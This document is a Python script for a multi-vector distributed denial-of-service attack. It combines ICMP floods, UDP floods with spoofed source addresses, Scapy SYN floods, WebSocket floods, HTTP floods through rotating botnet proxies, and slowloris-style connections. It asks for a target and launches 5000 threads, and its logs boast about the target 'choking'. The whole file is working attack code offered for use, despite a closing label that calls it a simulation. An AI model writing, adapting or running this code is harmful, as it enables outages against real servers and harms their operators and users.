import random
import sys
import threading
import requests
from fake_headers import Headers
from botnet import proxies  # Assume this has a huge list of proxies
import os
import socket
import struct
from scapy.all import *
import time
from loguru import logger
import websocket
import ssl
import json
import string

# -------------------------
# Fixed ICMP checksum for reliability
# -------------------------
def checksum(data):
    sum_val = 0
    for i in range(0, len(data), 2):
        if i + 1 < len(data):
            word = (data[i] << 8) + data[i + 1]
        else:
            word = data[i] << 8
        sum_val += word
    sum_val = (sum_val >> 16) + (sum_val & 0xffff)
    sum_val += sum_val >> 16
    return ~sum_val & 0xffff

# -------------------------
# ICMP echo flood
# -------------------------
def send_icmp_echo(dest_addr, payload, identifier=None, sequence=None):
    if identifier is None:
        identifier = os.getpid() & 0xffff
    if sequence is None:
        sequence = random.randint(1, 65535)

    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    icmp_type = 8
    icmp_code = 0
    icmp_checksum = 0
    icmp_id = identifier
    icmp_seq = sequence

    header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    payload_bytes = payload.encode("utf-8") * random.randint(10, 50)
    icmp_checksum = checksum(header + payload_bytes)
    header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)

    for _ in range(10):  # Burst send
        icmp_socket.sendto(header + payload_bytes, (dest_addr, 1))

# -------------------------
# UDP flood with spoofing
# -------------------------
def udp_flood(dest_ip, dest_port=80):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    while True:
        src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            69, 0, 40, random.randint(1,65535), 0, 64, 17, 0,
            socket.inet_aton(src_ip), socket.inet_aton(dest_ip)
        )
        udp_header = struct.pack('!HHHH', random.randint(1024,65535), dest_port, 8 + len(b'fuck'*1024), 0)
        packet = ip_header + udp_header + (b'fuck'*1024)
        sock.sendto(packet, (dest_ip, dest_port))

# -------------------------
# WebSocket flood
# -------------------------
def websocket_flood(url):
    while True:
        try:
            ws = websocket.create_connection(url, timeout=5, sslopt={"cert_reqs": ssl.CERT_NONE})
            for _ in range(100):
                ws.send(json.dumps({"data": ''.join(random.choices(string.ascii_letters + string.digits, k=1024))}))
            ws.close()
        except:
            pass

# -------------------------
# Multi-vector HTTP flood
# -------------------------
def http_flood(session, host, method, headers_gen):
    url = f"http://{host}"
    data = ''.join(random.choices(string.ascii_letters, k=10240))  # 10KB body
    try:
        if method == "POST":
            session.post(url, data=data, headers=headers_gen.generate(), timeout=3)
        elif method == "PUT":
            session.put(url, data=data, headers=headers_gen.generate(), timeout=3)
        else:
            session.get(url, headers=headers_gen.generate(), timeout=3,
                        params={"q": ''.join(random.choices(string.ascii_letters, k=512))})
    except:
        pass

# -------------------------
# SYN flood with Scapy
# -------------------------
def syn_flood(dest_ip):
    while True:
        ip = IP(dst=dest_ip, src=RandIP())
        tcp = TCP(sport=RandShort(), dport=random.choice([80,443,8080]), flags="S", seq=random.randint(1000,900000))
        raw = Raw(b"X" * random.randint(512, 1024))
        p = ip / tcp / raw
        send(p, loop=0, verbose=0, count=50)

# -------------------------
# Main multi-vector attack
# -------------------------
def multi_vector_attack(th_num, host):
    count = 0
    session = requests.Session()
    session.proxies.update({"http": random.choice(proxies), "https": random.choice(proxies)})
    headers_gen = Headers()
    methods = ["GET", "POST", "PUT"]
    ws_url = f"ws://{host}"
    dest_ip = socket.gethostbyname(host)

    while True:
        try:
            count += 1
            # HTTP layer
            http_flood(session, host, random.choice(methods), headers_gen)
            logger.debug(f"[THREAD {th_num} | ATTEMPT {count}] HTTP {random.choice(methods)} flood hammered!")

            # ICMP
            send_icmp_echo(host, "fuckthisserver" * random.randint(50,200))
            logger.debug(f"[THREAD {th_num} | ATTEMPT {count}] ICMP echo hammered!")

            # UDP
            threading.Thread(target=udp_flood, args=(dest_ip, random.choice([53,80,443,1900]))).start()
            logger.debug(f"[THREAD {th_num} | ATTEMPT {count}] UDP flood unleashed!")

            # SYN
            threading.Thread(target=syn_flood, args=(dest_ip,)).start()
            logger.debug(f"[THREAD {th_num} | ATTEMPT {count}] SYN packets blasting!")

            # WebSocket
            threading.Thread(target=websocket_flood, args=(ws_url,)).start()
            logger.debug(f"[THREAD {th_num} | ATTEMPT {count}] WebSocket connections spamming!")

            # Slowloris evasion
            slow_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            slow_s.connect((host, 80))
            slow_s.send(b"GET / HTTP/1.1\r\nHost:" + host.encode() + b"\r\n")
            time.sleep(random.randint(5,15))
            slow_s.close()

            # Rotate proxy per cycle
            session.proxies.update({"http": random.choice(proxies), "https": random.choice(proxies)})

        except Exception as e:
            logger.success(f"Target choking hard, thread {th_num} persisting through errors!")

# -------------------------
# Launch simulation
# -------------------------
if __name__ == "__main__":
    host = str(input("Target domain or IP >>> "))
    threads = 5000  # Adjust for your system capability

    for i in range(threads):
        threading.Thread(target=multi_vector_attack, args=(i, host)).start()
        if i % 100 == 0:
            time.sleep(0.01)

    print(f"{threads} threads targeting {host} with multi-vector attack simulation.")
